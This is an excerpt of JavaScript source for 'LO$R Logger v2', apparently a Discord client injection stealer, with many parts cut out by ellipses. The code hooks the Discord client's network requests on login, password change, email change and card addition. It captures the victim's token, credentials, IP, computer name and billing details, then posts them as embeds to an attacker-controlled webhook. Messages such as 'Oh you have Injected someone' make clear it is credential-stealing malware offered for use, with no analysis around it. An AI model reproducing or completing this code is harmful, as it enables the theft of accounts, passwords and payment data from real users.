...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/madhead341/LOSR-Logger-v2",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: "LO$R Logger v2 | https://github.com/madhead341/LOSR-Logger-v2"
            },
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/avatars/1083368117230653460/a_763b3fec4cc9b04e9e0a3402fc3c39e8.gif"
        if (!user.banner) var userBanner = "https://cdn.discordapp.com/banners/1083368117230653460/a_b391f318fca4c78e4ad850769672ba07.gif?size=512&width=0&height=0"
        ...
        var params = await makeEmbed({
            title: "LO$R Injector Initalized",
            fields: [{
                name: "Injection Info",
                ...
                name: "@Copyright",
                value: `[LO$R Logger 2023 https://github.com/madhead341/LOSR-Logger-v2`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "LO$R Injection Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "LO$R Injection User Login",
                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Injected someone**](https://github.com/madhead341/LOSR-Logger-v2)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "LO$R Injection Detected a Password Change",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Injected someone**](https://github.com/madhead341/LOSR-Logger-v2)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "@Copyright",
                        value: `[LO$R Logger 2023 https://github.com/madhead341/LOSR-Logger`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
...
gif:1041634542093619260>",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "LO$R Injection Detect Email Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Injected someone**](https://github.com/madhead341/LOSR-Logger-v2)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "@Copyright",
                        value: `[BlackCap 2023 https://github.com/madhead341/LOSR-Logger-v2`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "LO$R Injection User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
